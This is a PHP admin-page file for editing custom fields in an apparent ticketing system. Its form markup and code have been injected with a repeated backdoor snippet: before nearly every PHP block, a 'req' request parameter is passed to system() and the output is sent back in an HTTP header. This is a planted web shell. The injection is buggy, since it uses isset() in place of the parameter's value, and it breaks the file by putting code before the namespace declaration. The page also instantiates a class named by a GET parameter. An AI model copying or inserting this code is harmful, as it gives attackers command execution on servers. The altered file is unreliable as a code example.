<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Custom Fields'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$cf_table = $_GET['table_access'];

$enabled = false;
if (class_exists($cf_table, false)) {
	$cf_class = new $cf_table();
	if ($cf_class->is_cf_enabled()) {
		$enabled = true;
	}
}

if (!$enabled) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$id = (int) $url->get_item();

$custom_field_groups		= $table_access_cf->get(array('id' => $id));
	
if (empty($custom_field_groups)) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$custom_field = $custom_field_groups[0];

if (isset($_POST['delete'])) {
	//$table_access_cf->delete_group(array('id' => $custom_field['id']));
	header('Location: ' . $config->get('address') . '/settings/tickets/#custom_fields');
	exit;
}

if (isset($_POST['save'])) {
	if (!empty($_POST['name'])) {
		//$add_array['type']				= $_POST['type'];
		$add_array['name']				= $_POST['name'];
		$add_array['client_modify']		= 1;
		$add_array['enabled']			= $_POST['enabled'] ? 1 : 0;

		$table_access_cf->edit(array('columns' => $add_array, 'id' => $id));
		
		//$ticket_custom_fields->delete_fields(array('ticket_field_group_id' => $id));
		
		/*
		if ($add_array['type'] == 'dropdown') {			
			foreach($_POST['dropdown_field'] as $index => $value){
				if (!empty($value)) {
					$ticket_custom_fields->add_field(array('ticket_field_group_id' => $id, 'value' => $value));
				}
			}
			
			//update existing fields
			foreach($_POST as $index => $value){
				if(strncasecmp($index, 'existing_field-', 15) === 0) {
					$field_index 					= explode('-', $index);
					if (!empty($value)) {
						$item_array['value']		= $value;
						$item_array['id']			= (int) $field_index[1];
						$ticket_custom_fields->edit_field($item_array);
						unset($item_array);
					}
					else {
						$item_array['id']			= (int) $field_index[1];
						$ticket_custom_fields->delete_field($item_array);
						unset($item_array);
					}
				}
			}
		}
		*/
		
		header('Location: ' . $config->get('address') . '/' . $cf_class->get_cf_settings_url());
		exit;
		//$message = $language->get('Saved');
		
	}
	else {
		$message = $language->get('Name empty');
	}
}


include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">

	<script type="text/javascript">
		$(document).ready(function () {
			$('#delete').click(function () {
				if (confirm("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('All data attached to this custom field will be deleted. Are you sure you wish to delete this Custom Field?')); ?>")){
					return true;
				}
				else{
					return false;
				}
			});
		});
	</script>

	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Custom Fields')); ?></h4>
				</div>
			
				
				<div class="pull-right">
					<p>
						<button type="submit" name="save" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Save')); ?></button>
						<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($cf_class->get_cf_settings_url()); ?>" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
					</p>
				</div>
					
				<div class="clearfix"></div>	

				<br />
				<!--<div class="pull-right"><button type="submit" id="delete" name="delete" class="btn btn-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Delete')); ?></button></div>-->
				<div class="clearfix"></div>

			</div>
		</div>

		<div class="col-md-9">

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			<div class="well well-sm">
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?><br /><input type="text" name="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field['name']); ?>" size="30" /></p>
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Enabled'); ?><br />
					<select name="enabled">
						<option value="0"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['enabled'] == '0') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('No'); ?></option>
						<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['enabled'] == '1') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Yes'); ?></option>
					</select>
				</p>
				
				<!--		
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Guest & Submitter Can View/Edit'); ?><br />
					<select name="client_modify">
						<option value="0"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['client_modify']) && $_POST['client_modify'] == '0') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('No'); ?></option>
						<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['client_modify']) && $_POST['client_modify'] == '1') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Yes'); ?></option>
					</select>
				</p>
				-->
			
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Input Type'); ?><br />
					<select name="type" id="custom_field_type" disabled="disabled">
						<option value="textinput"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['type'] == 'textinput') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Text Input'); ?></option>
						<option value="textarea"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['type'] == 'textarea') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Text Area'); ?></option>
						<option value="date"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['type'] == 'date') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Date'); ?></option>
						<option value="datetime"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field['type'] == 'datetime') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Date & Time'); ?></option>
					</select>
				</p>


			</div>
				
			<div class="clearfix"></div>

		</div>

	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>